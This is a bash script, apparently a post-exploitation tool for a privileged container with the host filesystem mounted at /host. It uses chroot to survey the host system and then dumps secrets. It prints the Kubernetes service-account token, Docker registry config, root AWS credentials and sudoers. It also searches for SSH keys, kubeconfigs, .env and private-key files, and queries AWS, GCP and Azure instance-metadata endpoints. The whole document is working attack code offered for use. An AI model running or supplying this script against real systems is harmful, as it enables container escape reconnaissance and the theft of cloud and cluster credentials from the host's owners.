#!/bin/bash
# Comprehensive Host System Enumeration
# Run from privileged container with /host mount

echo "=========================================="
echo "  HOST SYSTEM ENUMERATION"
echo "=========================================="
echo ""

echo "=== 1. SYSTEM INFORMATION ==="
echo "[*] Operating System:"
chroot /host cat /etc/os-release 2>/dev/null | head -10 || echo "  Cannot read OS info"
echo ""

echo "[*] Kernel Version:"
chroot /host uname -a 2>/dev/null || echo "  Cannot get kernel info"
echo ""

echo "[*] Hostname:"
chroot /host hostname 2>/dev/null || echo "  Cannot get hostname"
echo ""

echo "[*] Uptime:"
chroot /host uptime 2>/dev/null || echo "  Cannot get uptime"
echo ""

echo "=== 2. HARDWARE INFORMATION ==="
echo "[*] CPU Information:"
chroot /host cat /proc/cpuinfo 2>/dev/null | grep -E "(model name|processor|cpu cores)" | head -5 || echo "  Cannot read CPU info"
echo ""

echo "[*] Memory Information:"
chroot /host cat /proc/meminfo 2>/dev/null | head -5 || echo "  Cannot read memory info"
echo ""

echo "[*] Disk Usage:"
chroot /host df -h 2>/dev/null | head -10 || echo "  Cannot read disk info"
echo ""

echo "=== 3. NETWORK CONFIGURATION ==="
echo "[*] Network Interfaces:"
chroot /host ip addr show 2>/dev/null || chroot /host ifconfig 2>/dev/null || cat /host/proc/net/dev 2>/dev/null | head -10
echo ""

echo "[*] Routing Table:"
chroot /host ip route 2>/dev/null || chroot /host route -n 2>/dev/null || cat /host/proc/net/route 2>/dev/null | head -10
echo ""

echo "[*] ARP Table:"
chroot /host arp -a 2>/dev/null || cat /host/proc/net/arp 2>/dev/null
echo ""

echo "[*] Listening Ports:"
chroot /host netstat -tulpn 2>/dev/null | head -20 || chroot /host ss -tulpn 2>/dev/null | head -20 || echo "  netstat/ss not available"
echo ""

echo "[*] Network Connections:"
chroot /host netstat -an 2>/dev/null | head -20 || chroot /host ss -an 2>/dev/null | head -20 || cat /host/proc/net/tcp 2>/dev/null | head -10
echo ""

echo "=== 4. USERS AND GROUPS ==="
echo "[*] Users (passwd):"
chroot /host cat /etc/passwd 2>/dev/null | head -20 || cat /host/etc/passwd 2>/dev/null | head -20
echo ""

echo "[*] Groups:"
chroot /host cat /etc/group 2>/dev/null | head -20 || cat /host/etc/group 2>/dev/null | head -20
echo ""

echo "[*] Sudoers:"
chroot /host cat /etc/sudoers 2>/dev/null | grep -v "^#" | grep -v "^$" || echo "  Cannot read sudoers"
echo ""

echo "[*] Last logged in users:"
chroot /host last 2>/dev/null | head -10 || echo "  Cannot read last logins"
echo ""

echo "=== 5. RUNNING PROCESSES ==="
echo "[*] Top processes:"
chroot /host ps aux 2>/dev/null | head -20 || cat /host/proc/*/stat 2>/dev/null | head -5 || echo "  Cannot read processes"
echo ""

echo "[*] Process tree:"
chroot /host pstree 2>/dev/null | head -20 || echo "  pstree not available"
echo ""

echo "=== 6. SYSTEMD SERVICES ==="
echo "[*] Running services:"
chroot /host systemctl list-units --type=service --state=running 2>/dev/null | head -20 || echo "  systemctl not available"
echo ""

echo "[*] Enabled services:"
chroot /host systemctl list-unit-files --type=service --state=enabled 2>/dev/null | head -20 || echo "  systemctl not available"
echo ""

echo "=== 7. CRON JOBS ==="
echo "[*] Root crontab:"
chroot /host crontab -l -u root 2>/dev/null || cat /host/var/spool/cron/crontabs/root 2>/dev/null || cat /host/etc/crontab 2>/dev/null || echo "  No root crontab found"
echo ""

echo "[*] System crontab:"
cat /host/etc/crontab 2>/dev/null || echo "  No system crontab"
echo ""

echo "[*] Cron directories:"
ls -la /host/etc/cron.d/ 2>/dev/null | head -10 || echo "  /etc/cron.d not found"
ls -la /host/etc/cron.daily/ 2>/dev/null | head -5 || echo "  /etc/cron.daily not found"
echo ""

echo "=== 8. MOUNTED FILESYSTEMS ==="
echo "[*] Mounts:"
chroot /host mount 2>/dev/null | head -20 || cat /host/proc/mounts 2>/dev/null | head -20
echo ""

echo "[*] Fstab:"
cat /host/etc/fstab 2>/dev/null || echo "  Cannot read fstab"
echo ""

echo "=== 9. INSTALLED SOFTWARE ==="
echo "[*] Installed packages (dpkg):"
chroot /host dpkg -l 2>/dev/null | head -20 || echo "  dpkg not available"
echo ""

echo "[*] Installed packages (rpm):"
chroot /host rpm -qa 2>/dev/null | head -20 || echo "  rpm not available"
echo ""

echo "[*] Installed packages (apk):"
chroot /host apk list --installed 2>/dev/null | head -20 || echo "  apk not available"
echo ""

echo "=== 10. DOCKER/KUBERNETES ==="
echo "[*] Docker socket:"
ls -la /host/var/run/docker.sock 2>/dev/null || ls -la /host/run/docker.sock 2>/dev/null || echo "  Docker socket not found"
echo ""

echo "[*] Containerd socket:"
ls -la /host/var/run/containerd/containerd.sock 2>/dev/null || ls -la /host/run/containerd/containerd.sock 2>/dev/null || echo "  containerd socket not found"
echo ""

echo "[*] Kubernetes components:"
ls -la /host/var/lib/kubelet/ 2>/dev/null | head -10 || echo "  Kubelet not found"
ls -la /host/etc/kubernetes/ 2>/dev/null | head -10 || echo "  Kubernetes config not found"
echo ""

echo "[*] Kubernetes service account:"
cat /host/var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null && echo "  [FOUND] Service account token exists!" || echo "  No service account token"
cat /host/var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null && echo "  Namespace found" || echo "  No namespace file"
echo ""

echo "=== 11. CREDENTIALS AND SENSITIVE FILES ==="
echo "[*] SSH keys:"
ls -la /host/root/.ssh/ 2>/dev/null | head -10 || echo "  No root .ssh directory"
find /host/home -name ".ssh" -type d 2>/dev/null | head -5
echo ""

echo "[*] Docker config:"
cat /host/root/.docker/config.json 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "  No Docker config found"
find /host/home -name ".docker" -type d 2>/dev/null | head -5
echo ""

echo "[*] Kubernetes config:"
find /host -name "kubeconfig" 2>/dev/null | head -5
find /host -path "*/.kube/config" 2>/dev/null | head -5
echo ""

echo "[*] AWS credentials:"
find /host -name ".aws" -type d 2>/dev/null | head -5
cat /host/root/.aws/credentials 2>/dev/null | head -10 || echo "  No AWS credentials"
echo ""

echo "[*] Environment files:"
find /host -name ".env" -type f 2>/dev/null | head -10
find /host -name "*.pem" -o -name "*.key" -o -name "*.p12" 2>/dev/null | head -10
echo ""

echo "=== 12. CLOUD METADATA ==="
echo "[*] AWS metadata:"
curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -10 || echo "  Not AWS or metadata not accessible"
echo ""

echo "[*] GCP metadata:"
curl -s --max-time 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ 2>/dev/null | head -10 || echo "  Not GCP or metadata not accessible"
echo ""

echo "[*] Azure metadata:"
curl -s --max-time 2 -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null | head -10 || echo "  Not Azure or metadata not accessible"
echo ""

echo "=== 13. FILE PERMISSIONS ==="
echo "[*] SUID binaries:"
find /host -perm -4000 -type f 2>/dev/null | head -20
echo ""

echo "[*] SGID binaries:"
find /host -perm -2000 -type f 2>/dev/null | head -20
echo ""

echo "[*] World-writable files:"
find /host -perm -0002 -type f 2>/dev/null | head -20
echo ""

echo "=== 14. LOG FILES ==="
echo "[*] Recent auth logs:"
chroot /host tail -20 /var/log/auth.log 2>/dev/null || chroot /host tail -20 /var/log/secure 2>/dev/null || echo "  Auth logs not accessible"
echo ""

echo "[*] System logs:"
chroot /host journalctl -n 20 --no-pager 2>/dev/null | head -20 || echo "  Journal not accessible"
echo ""

echo "=========================================="
echo "  ENUMERATION COMPLETE"
echo "=========================================="
